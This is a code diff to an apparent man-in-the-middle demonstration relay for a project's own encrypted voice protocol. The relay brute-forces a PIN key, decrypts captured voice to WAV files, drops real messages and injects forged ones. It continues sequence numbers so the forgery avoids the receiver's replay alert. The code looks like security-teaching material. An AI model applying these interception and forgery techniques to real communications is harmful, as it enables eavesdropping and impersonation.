@@ -127,18 +127,25 @@ class InspectionRelay:
         self._hs = {}                    # captured handshake fields
         self._cracked = False
         self._crack_failed = False
-        self._forged = False
-        self.source_transmitting = False     # True once a peer starts sending (forge)
-        self.injected = False                # True once a fake has been sent
+        # --- forge state. It re-arms after every injection so several messages,
+        #     in either direction, can each be intercepted and faked in turn. ---
+        self._forged = False                 # a message is currently claimed for forging
+        self.source_transmitting = False     # True while a claimed message awaits its fake
+        self.injected = False                # True once at least one fake has been sent
+        self.detections = 0                  # how many transmissions have been intercepted
+        self.injections = 0                  # how many fakes have been injected
         self._dst_sock = None                # destination socket (b)
-        self._forge_dst = None               # where the fake goes (the forged direction's dst)
+        self._forge_dst = None               # where the current fake goes
         self._forge_dir_byte = P.DIR_INITIATOR
-        self._saved_count = 0                # recovered WAVs already written
+        self._last_frame_time = {}           # dir_byte -> arrival time of its last DATA frame
+        self._sent_seq = {P.DIR_INITIATOR: -1, P.DIR_RESPONDER: -1}  # last seq delivered per dir
+        self._forge_msg_id = 0               # message id stamped on each forged message
+        self._saved = set()                  # sha256 of recovered PCMs already written to disk
         self._inject_lock = threading.Lock()
         self._crack_lock = threading.Lock()
         self.cracked_pin: Optional[str] = None
         self.aes_key: Optional[bytes] = None
-        self.recovered = []              # list[(Intercepted, pcm, rate)] after a crack
+        self.recovered = []              # list[(direction, pcm, rate)] after a crack
         self.cracking = False            # True while the brute force is running (for the GUI)
         self.crack_tries = 0
         self.crack_total = 10 ** pin_digits
@@ -222,16 +229,25 @@ class InspectionRelay:
 
     def inject_fake(self, pcm: bytes, rate: int = 16000) -> bool:
         """Send the attacker's fake message to the peer on the far side of the
-        forged direction, encrypted with the recovered key (seq 0..) so it looks
-        like the real sender. Called live from the GUI once a fake is ready."""
+        currently intercepted direction, encrypted with the recovered key. The
+        forged frames continue the sequence numbers that direction has already
+        delivered, so the receiver accepts them. Then re-arm, so the NEXT
+        transmission (either direction) can be intercepted and forged too."""
         with self._inject_lock:
-            if self.injected:
+            if not self.source_transmitting:       # nothing is being intercepted right now
                 return False
             key = self._ensure_cracked()
-            if not key or not self._forge_dst or not pcm:
+            with self._lock:
+                dst, dir_byte = self._forge_dst, self._forge_dir_byte
+            if not key or not dst or not pcm:
                 return False
-            self._emit_forged(self._forge_dst, pcm, rate, self._forge_dir_byte)
+            self._emit_forged(dst, pcm, rate, dir_byte)
             self.injected = True
+            self.injections += 1
+            with self._lock:                        # disarm; a new burst re-arms the claim
+                self.source_transmitting = False
+                self._forged = False
+                self._forge_dst = None
             return True
 
     def _emit_forged(self, dst: socket.socket, pcm: bytes, rate: int, dir_byte: int) -> None:
@@ -239,7 +255,15 @@ class InspectionRelay:
         from .crypto_layers import AESLayer
         import hashlib
         aes = AESLayer(self.aes_key)
-        seq = 0
+        # Continue the sequence numbers already delivered on this direction. The
+        # receiver requires strictly increasing seq, so a fake that restarted at 0
+        # after an earlier message on the same direction would be rejected as a
+        # replay -- which would raise a SECURITY ALERT and give the forgery away.
+        with self._lock:
+            self._forge_msg_id += 1
+            mid_val = self._forge_msg_id
+            seq = self._sent_seq.get(dir_byte, -1) + 1
+        start = seq
 
         def emit(pt: bytes):
             nonlocal seq
@@ -247,22 +271,27 @@ class InspectionRelay:
             P.send_frame(dst, P.T_DATA, seq.to_bytes(8, "big") + ct)
             seq += 1
 
-        meta = {"id": 1, "rate": rate, "channels": 1, "width": 2,
+        meta = {"id": mid_val, "rate": rate, "channels": 1, "width": 2,
                 "size": len(pcm), "sha256": hashlib.sha256(pcm).hexdigest()}
         emit(bytes([K_BEGIN]) + json.dumps(meta).encode())
-        mid = (1).to_bytes(4, "big")
+        mid = mid_val.to_bytes(4, "big")
         for i in range(0, len(pcm), CHUNK):
             emit(bytes([K_CHUNK]) + mid + pcm[i:i + CHUNK])
         emit(bytes([K_END]) + mid)
+        with self._lock:
+            self._sent_seq[dir_byte] = seq - 1
         self.on_log(f"[relay] *** FORGED a fake voice message ({len(pcm)} bytes, "
-                    f"{seq} frames) and sent it to the receiver as the real sender ***")
+                    f"{seq - start} frames, seq {start}..{seq - 1}) and sent it to the "
+                    "receiver as the real sender ***")
 
     def recover_all(self) -> list:
         """Brute-force the PIN (once) and decrypt the captured ciphertext into the
         real voice. Collects every DATA frame per direction — one voice message can
         be split across several time-bursts on a slow network — decrypts them in
         sequence order and reassembles whole messages by their K_BEGIN/K_CHUNK/K_END
-        markers. Returns [(direction, pcm, rate), ...]. Safe to call live."""
+        markers. Messages are returned in the order they were captured, so the LAST
+        entry is the most recent one sent. Returns [(direction, pcm, rate), ...].
+        Safe to call live."""
         if not self.intercepted:
             self.on_log("[relay] nothing captured yet — have a peer send a message first")
             return []
@@ -277,13 +306,22 @@ class InspectionRelay:
         aes = AESLayer(key)
         with self._lock:
             bursts = list(self.intercepted)
-        frames_by_dir = {}
+        # Flatten every captured frame, deduped by (direction, seq), and remember
+        # the order each frame was intercepted in so messages can be time-ordered
+        # across the two directions (seq alone is per-direction and not comparable).
+        by_dir = {}                                       # direction -> {seq: ct}
+        order = {}                                        # (direction, seq) -> capture index
+        idx = 0
         for m in bursts:
-            frames_by_dir.setdefault(m.direction, {}).update(m.frames_data)   # seq -> ct, deduped
-        out = []
-        for direction, fmap in frames_by_dir.items():
+            dd = by_dir.setdefault(m.direction, {})
+            for seq, ct in m.frames_data:
+                dd[seq] = ct
+                order[(m.direction, seq)] = idx
+                idx += 1
+        msgs = []                                         # (capture_index_of_begin, dir, pcm, rate)
+        for direction, fmap in by_dir.items():
             dir_byte = DIR_OF.get(direction, P.DIR_INITIATOR)
-            msg, meta = None, None
+            msg, meta, begin = None, None, 0
             for seq in sorted(fmap):
                 try:
                     pt = aes.decrypt(fmap[seq], P.data_nonce(dir_byte, seq),
@@ -293,25 +331,30 @@ class InspectionRelay:
                 kind, body = pt[0], pt[1:]
                 if kind == K_BEGIN:
                     msg, meta = bytearray(), json.loads(body)
+                    begin = order.get((direction, seq), seq)
                 elif kind == K_CHUNK and msg is not None:
                     msg += body[4:]
                 elif kind == K_END and msg is not None:
                     rate = int(meta.get("rate", 16000)) if meta else 16000
-                    out.append((direction, bytes(msg), rate))
+                    msgs.append((begin, direction, bytes(msg), rate))
                     msg, meta = None, None
             if msg:                                       # message captured without its K_END
                 rate = int(meta.get("rate", 16000)) if meta else 16000
-                out.append((direction, bytes(msg), rate))
+                msgs.append((begin, direction, bytes(msg), rate))
+        msgs.sort(key=lambda t: t[0])                     # capture (time) order across directions
+        out = [(d, pcm, rate) for _, d, pcm, rate in msgs]
         if self.capture_dir and out:
             from .audio import save_wav
+            import hashlib
             os.makedirs(self.capture_dir, exist_ok=True)
             for i, (direction, pcm, rate) in enumerate(out, 1):
-                if i > self._saved_count:
+                h = hashlib.sha256(pcm).hexdigest()       # save each distinct message once
+                if h not in self._saved:
+                    self._saved.add(h)
                     path = os.path.join(self.capture_dir, time.strftime(f"recovered_%H%M%S_{i}.wav"))
                     save_wav(path, pcm, rate)
                     self.on_log(f"[relay] decrypted the REAL voice ({direction}) → {path} "
                                 f"({len(pcm)} bytes, {len(pcm) / 2 / rate:.1f}s)")
-            self._saved_count = max(self._saved_count, len(out))
         self.recovered = out
         return out
 
@@ -389,24 +432,43 @@ class InspectionRelay:
                             self.on_log(f"[relay] {label} DATA seq={seq} {len(ct)}B "
                                         f"entropy={shannon_entropy(ct):.3f} bits/byte")
                         if self.mode == "forge":
-                            # the FIRST direction to send is forged (dropped + faked);
-                            # the other direction keeps flowing normally
+                            # Forge whichever message is being sent, in either
+                            # direction, one at a time. A gap longer than BURST_GAP
+                            # on a direction marks the start of a new message; the
+                            # rest of a message (small gaps) is dropped as the tail
+                            # of the one already claimed. After each injection the
+                            # claim is cleared, so the next new message re-arms it.
+                            dir_byte = DIR_OF.get(label, P.DIR_INITIATOR)
+                            now = time.time()
                             with self._lock:
-                                claim = not self._forged
-                                if claim:
+                                last = self._last_frame_time.get(dir_byte, 0.0)
+                                new_burst = now - last > BURST_GAP
+                                self._last_frame_time[dir_byte] = now
+                                if self.source_transmitting:         # already awaiting a fake
+                                    action = "drop" if dir_byte == self._forge_dir_byte else "forward"
+                                elif new_burst:                      # a new message starts here
+                                    action = "claim"
                                     self._forged = True
                                     self._forge_dst = dst
-                                    self._forge_dir_byte = DIR_OF.get(label, P.DIR_INITIATOR)
-                            if claim:
+                                    self._forge_dir_byte = dir_byte
+                                    self.detections += 1
+                                    self.source_transmitting = True
+                                elif dir_byte == self._forge_dir_byte:
+                                    action = "drop"                  # tail of the message just forged
+                                else:
+                                    action = "forward"
+                                if action == "forward":              # keep the receiver's seq in step
+                                    self._sent_seq[dir_byte] = seq
+                            if action == "claim":
                                 out = []
-                                self.source_transmitting = True
-                                self.on_log(f"[relay] *** {label} IS TRANSMITTING — intercepting and "
-                                            "dropping the real message; record a fake and inject it ***")
+                                self.on_log(f"[relay] *** {label} IS TRANSMITTING (message "
+                                            f"#{self.detections}) — intercepting and dropping the real "
+                                            "message; record a fake and inject it ***")
                                 self._ensure_cracked()
                                 if self.fake_pcm:        # pre-staged fake: inject right away
                                     self.inject_fake(self.fake_pcm, self.fake_rate)
-                            elif DIR_OF.get(label) == self._forge_dir_byte:
-                                out = []                 # keep dropping the forged direction
+                            elif action == "drop":
+                                out = []
                         elif apply_mode and data_count == self.trigger_frame:
                             out = self._apply(raw, history)
                         history.append(raw)
